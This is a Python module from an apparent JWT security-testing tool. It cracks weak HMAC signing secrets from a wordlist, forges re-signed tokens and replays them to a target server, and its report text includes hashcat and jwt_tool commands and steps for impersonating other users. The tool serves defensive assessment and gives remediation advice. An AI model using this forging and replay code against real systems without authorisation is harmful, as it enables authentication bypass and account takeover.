"""Attack 3: weak HMAC secret, the token is signed with a guessable key.

An HS256/384/512 token is signed with a shared secret. If that secret is a dictionary word or
a common default, anyone can recover it offline: sign the token's own data with each candidate
and see which one reproduces the token's signature. Recovering the secret is total compromise,
the attacker can then mint a valid token for any user.

Unlike the network-driven checks, the crack here is OFFLINE and conclusive: a matching signature
IS the proof, no response comparison required. We still (best-effort) mint a token with the
recovered secret and send it, to show the server trusting a token we signed ourselves.
"""

from pathlib import Path

from jwtpen.core.jwt_utils import decode, encode, construct_jwt, sign_hmac
from jwtpen.core.raw_request import parse_request, swap_token
from jwtpen.core.checker import send, classify, ACCEPTED
from jwtpen.attacks.base import Finding, VULNERABLE, NOT_VULNERABLE, INCONCLUSIVE, SKIPPED, HIGH

# The HMAC algorithms this attack applies to. Anything else (RS256, ES256, none, ...) has no
# shared secret to guess, so the check is skipped.
HMAC_ALGS = ("HS256", "HS384", "HS512")

# This check can't run without a list of candidate secrets. The registry exposes this flag so
# the UI can require a wordlist for this check (built-in list and/or an uploaded/pasted one).
REQUIRES_WORDLIST = True

# The bundled secret list, at the project root. Small on purpose: a fast first pass; real
# engagements point a cracker at SecLists/rockyou, which the report's follow-up notes.
WORDLIST_PATH = Path(__file__).resolve().parents[2] / "wordlists" / "common-secrets.txt"


def parse_wordlist(text):
    """Parse wordlist text into secrets: one per non-blank line, skipping '#' comments."""
    secrets = []
    for line in text.splitlines():
        stripped = line.strip()
        if stripped and not stripped.startswith("#"):
            secrets.append(stripped)
    return secrets


def load_wordlist(path=WORDLIST_PATH):
    """Read the bundled (or a given) secret wordlist file into a list of secrets."""
    return parse_wordlist(Path(path).read_text(encoding="utf-8"))


# How many secrets the built-in list holds, for the UI to show next to its toggle. Computed once;
# if the file is somehow missing we fall back to 0 rather than breaking import.
try:
    BUILTIN_COUNT = len(load_wordlist())
except OSError:
    BUILTIN_COUNT = 0


def _secrets_for(options):
    """Build the ordered, de-duplicated secret list to try, from the scan's wordlist options.

    options may carry "wordlist" (user-supplied text) and "use_builtin" (whether to include the
    bundled list). Default, no options, is the built-in list alone, so a plain run still works.
    """
    options = options or {}
    custom = parse_wordlist(options.get("wordlist") or "")
    builtin = load_wordlist() if options.get("use_builtin", True) else []
    return list(dict.fromkeys(builtin + custom))   # keep order, drop duplicates


def crack(token, secrets):
    """Return the secret that signed `token`, or None if no candidate matches.

    We sign the token's ORIGINAL signing input (its first two parts, byte-for-byte) with each
    guess, re-encoding the header/payload could reorder keys and change the bytes, so we never
    rebuild it here; we compare against the token's own signature string directly.
    """
    header_part, payload_part, signature = token.split(".")
    signing_input = header_part + "." + payload_part
    alg = decode(token)[0].get("alg", "")
    for secret in secrets:
        if sign_hmac(signing_input, secret, alg) == signature:
            return secret
    return None


def forge(token, secret):
    """Re-sign the token's existing claims with `secret`, a token we minted ourselves."""
    header, payload, _ = decode(token)
    signing_input = encode(header, payload)
    return construct_jwt(signing_input, sign_hmac(signing_input, secret, header["alg"]))


# --- Static content for this attack's report section ---
NAME = "Weak HMAC Secret"
DESCRIPTION = "Tries to recover a guessable HMAC signing secret from a wordlist, which would let an attacker forge any token."

_SUMMARY = {
    VULNERABLE: ("The token's HMAC signing secret was guessable and was recovered from the "
                 "wordlist. Anyone with this secret can forge a valid token for any user, so "
                 "this is a complete authentication bypass."),
    NOT_VULNERABLE: ("The signing secret was not found in the wordlist, so it could not be cracked "
                     "with this list. This does not prove the secret is strong, only that it is "
                     "not one of the values tried."),
    INCONCLUSIVE: ("This check could not run because no wordlist was provided: with no candidate "
                   "secrets to test, the strength of the signing secret is unknown."),
    SKIPPED: ("This check applies only to HMAC-signed tokens (HS256/384/512), which share a "
              "secret that can be guessed. This token uses a different algorithm, so there is "
              "no shared secret to crack."),
}

_REPRODUCTION = [
    'Capture your session JWT and confirm its header "alg" is an HMAC algorithm (HS256, HS384 or HS512).',
    "Run a JWT secret cracker against the token with a wordlist, for example "
    "`hashcat -a 0 -m 16500 <token> wordlist.txt` or `jwt_tool <token> -C -d wordlist.txt`.",
    "If a secret is found, you now hold the server's signing key and can mint your own valid tokens.",
    'To demonstrate impact, change a claim such as "sub" to another user, re-sign the token with '
    "the recovered secret, and resend the request.",
    "If the server accepts it, you can impersonate any user. Re-test other authenticated endpoints too.",
]

_REMEDIATION = (
    "Sign HMAC tokens with a long, random, high-entropy secret, at least 32 bytes from a secure "
    "random source, never a dictionary word, default, or reused value. Keep it out of source "
    "control, rotate it periodically, and consider an asymmetric algorithm (RS256/ES256) so the "
    "verification key can be published without exposing the signing key."
)

_REFERENCES = [
    {"label": "OWASP: JSON Web Token Cheat Sheet",
     "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"},
    {"label": "RFC 7518: JSON Web Algorithms, HMAC key size",
     "url": "https://datatracker.ietf.org/doc/html/rfc7518#section-3.2"},
]


def run(raw_request, token, scheme, options=None):
    """Run the weak-secret check end to end and return a Finding.

    `options` carries this check's wordlist settings (see _secrets_for). The verdict comes from
    the offline crack. When the secret is found we also, best-effort, mint a token with it and
    send it to show the server accepting our self-signed token, but a network error there never
    changes the verdict, since the recovered secret already proves it.
    """
    alg = decode(token)[0].get("alg", "")
    url = _url(raw_request, scheme)

    # Not an HMAC token -> nothing to crack.
    if alg not in HMAC_ALGS:
        return Finding(
            attack=NAME, status=SKIPPED, severity=HIGH, summary=_SUMMARY[SKIPPED],
            methodology=[f'Read the token header; its algorithm is "{alg or "(none)"}", which is not an HMAC algorithm.'],
            evidence={"Target URL": url, "Algorithm": alg or "(none)"},
        )

    secrets = _secrets_for(options)
    # No secrets to try (built-in list disabled and none supplied). The UI guards against this,
    # but if it happens we can't judge the secret either way, so say so rather than guess.
    if not secrets:
        return Finding(
            attack=NAME, status=INCONCLUSIVE, severity=HIGH, summary=_SUMMARY[INCONCLUSIVE],
            methodology=["No wordlist was provided, so there were no candidate secrets to test."],
            evidence={"Target URL": url, "Algorithm": alg},
            manual_followup=["Enable the built-in list or supply a wordlist, then re-run this check."],
        )

    cracked = crack(token, secrets)

    methodology = [
        f'Confirmed the token is signed with an HMAC algorithm ("{alg}"), which uses a guessable shared secret.',
        f"Signed the token's own data with each of the {len(secrets)} secrets in the wordlist and compared the result to the token's signature.",
    ]
    evidence = {"Target URL": url, "Algorithm": alg, "Secrets Tried": len(secrets)}

    if cracked is None:
        status = NOT_VULNERABLE
        methodology.append("No secret in the wordlist reproduced the token's signature.")
        return Finding(
            attack=NAME, status=status, severity=HIGH, summary=_SUMMARY[status],
            methodology=methodology, reproduction=_REPRODUCTION, evidence=evidence,
            remediation=_REMEDIATION, references=_REFERENCES,
            manual_followup=[
                "Try a much larger wordlist (SecLists jwt.secrets.list, rockyou.txt) or a GPU "
                "cracker (hashcat mode 16500) before concluding the secret is strong.",
            ],
        )

    # Cracked: the match is proof on its own. Re-sign with the secret as demonstrable evidence,
    # and try to confirm acceptance over the network.
    status = VULNERABLE
    forged_token = forge(token, cracked)
    methodology.append(
        f'Recovered the signing secret: "{cracked}". Re-signing the token with it reproduces the '
        "original signature, confirming the secret."
    )
    evidence["Cracked Secret"] = cracked
    evidence["Forged Token"] = forged_token

    confirmation = _confirm(raw_request, token, forged_token, scheme)
    if confirmation == ACCEPTED:
        methodology.append("Minted a fresh token signed with the recovered secret, and the server accepted it.")
        evidence["Server Response (Minted Token)"] = "Accepted"

    return Finding(
        attack=NAME, status=status, severity=HIGH, summary=_SUMMARY[status],
        methodology=methodology, reproduction=_REPRODUCTION, evidence=evidence,
        remediation=_REMEDIATION, references=_REFERENCES,
        manual_followup=[
            "Treat the secret as compromised: rotate it immediately, since any token ever signed "
            "with it may have been forged.",
        ],
    )


# --- small helpers ---------------------------------------------------------
def _url(raw_request, scheme):
    """Best-effort target URL for the report header; '(unknown)' if the request won't parse."""
    try:
        parsed = parse_request(raw_request)
        return scheme + "://" + parsed["headers"]["Host"] + parsed["path"]
    except Exception:
        return "(unknown)"


def _confirm(raw_request, token, forged_token, scheme):
    """Best-effort: send the minted token and classify it against the baselines.

    Returns ACCEPTED / REJECTED / INCONCLUSIVE, or None if the target couldn't be reached. The
    crack already decided the verdict, so any failure here is swallowed, not surfaced as an error.
    """
    try:
        good = send(parse_request(raw_request), scheme)
        bad = send(parse_request(swap_token(raw_request, token, "INVALID")), scheme)
        forged = send(parse_request(swap_token(raw_request, token, forged_token)), scheme)
        return classify(good, bad, forged)
    except Exception:
        return None
